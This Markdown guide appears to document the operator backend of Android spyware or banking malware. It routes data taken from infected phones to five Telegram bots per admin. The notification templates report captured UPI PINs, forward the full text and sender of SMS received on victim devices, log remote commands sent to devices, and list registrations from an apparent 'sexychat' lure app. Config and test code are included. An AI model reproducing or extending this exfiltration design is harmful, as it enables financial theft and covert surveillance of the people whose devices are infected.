# Telegram Bots

Complete routing guide for 5 admin-specific Telegram bots.

## Bot Overview

Each admin has 5 dedicated bots for different notification types:

| Bot | Purpose | Notifications |
|-----|---------|--------------|
| Bot 1 | Device Management | New devices, UPI PINs |
| Bot 2 | SMS Only | New SMS received, send failures |
| Bot 3 | Admin Activities | Logins, commands, settings |
| Bot 4 | Authentication | 2FA OTP codes |
| Bot 5 | System Monitoring | Reserved for future |

## Bot 1: Device Management

### New Device Registration
```
?? New Device Registered
?? Device ID: DEVICE_123
?? Model: Samsung Galaxy S21
?? App Type: sexychat
```

### UPI PIN Detected
```
?? UPI PIN Detected
?? Device ID: DEVICE_123
?? PIN: 123456
?? Model: Samsung Galaxy S21
```

**Note:** Device Online/Offline is **NOT** logged (too much spam from 3-minute heartbeats).

## Bot 2: SMS Only

### New SMS Received
```
?? New SMS Received
?? Device: DEVICE_123
?? From: +989123456789
?? Time: 2025-11-10 12:30:00
━━━━━━━━━━━━━━━━━━━
?? Message:
سلام! این یک پیام تست است.
━━━━━━━━━━━━━━━━━━━
```

**Conditions:**
- Only **received** SMS (inbox)
- NOT sent SMS
- NOT bulk uploads

### SMS Send Failed
```
?? SMS Send Failed
?? Device: DEVICE_123
?? To: +989123456789
?? Error: Network error
```

## Bot 3: Admin Activities

### Login Activity
```
?? Admin Activity
?? Admin: admin_user
?? Action: login
?? IP: 192.168.1.100
? Time: 2025-11-10 12:00:00 UTC
```

### Command Sent
```
?? Admin Activity
?? Admin: admin_user
?? Action: send_command
?? Details: Sent ping to device
?? Device: DEVICE_123
?? IP: 192.168.1.100
```

### Settings Changed
```
?? Admin Activity
?? Admin: admin_user
?? Action: update_settings
?? Details: Updated device settings
?? Device: DEVICE_123
```

### Admin Created
```
?? Admin Activity
?? Admin: superadmin
?? Action: create_admin
?? Details: Created new admin: newadmin
```

## Bot 4: Authentication

### 2FA OTP Code
```
?? Two-Factor Authentication
?? Admin: admin
?? IP: 192.168.1.100
?? Code: 123456
? Time: 2025-11-10 12:00:00 UTC
```

### Bot Authentication
```
?? Bot Authentication Request
Bot: My Telegram Bot
?? Admin: admin
?? IP: 192.168.1.100
?? Code: 123456
```

## Bot 5: System Monitoring

Reserved for future use:
- System health alerts
- Database issues
- Performance warnings
- Critical errors

## Configuration

### Environment Variables

```env
ADMIN_BOT1_TOKEN=bot1-token
ADMIN_BOT1_CHAT_ID=-1001234567890

ADMIN_BOT2_TOKEN=bot2-token
ADMIN_BOT2_CHAT_ID=-1009876543210

ADMIN_BOT3_TOKEN=bot3-token
ADMIN_BOT3_CHAT_ID=-1001111222233

ADMIN_BOT4_TOKEN=bot4-token
ADMIN_BOT4_CHAT_ID=-1004444555566

ADMIN_BOT5_TOKEN=bot5-token
ADMIN_BOT5_CHAT_ID=-1007777888899
```

### Per-Admin Configuration

```json
{
  "username": "admin",
  "telegram_bots": [
    {
      "bot_id": 1,
      "bot_name": "Device Notifications",
      "token": "BOT_TOKEN_1",
      "chat_id": "-1001234567890"
    },
    {
      "bot_id": 2,
      "bot_name": "SMS Notifications",
      "token": "BOT_TOKEN_2",
      "chat_id": "-1009876543210"
    }
  ]
}
```

## Spam Prevention

**NEVER send these (too frequent):**
- Device Online/Offline (every 3 min heartbeat)
- Heartbeat received
- Normal data syncs

**Rate limits:**
- Max 10 notifications per minute per bot
- Batch similar notifications
- Deduplicate within 5 seconds

## Testing

```python
from app.services.telegram_multi_service import telegram_multi_service

await telegram_multi_service.notify_device_registered(
    admin_username="admin",
    device_id="test123",
    device_model="Test Device",
    app_type="test"
)
```

## Troubleshooting

### No Notifications Received
1. Check bot tokens in admin document
2. Verify chat IDs correct
3. Ensure bot not blocked
4. Check server logs

### Wrong Bot Receiving Messages
- Verify `bot_index` parameter correct
- Check routing in code
- Review `telegram_multi_service.py`

**Last Updated**: November 10, 2025
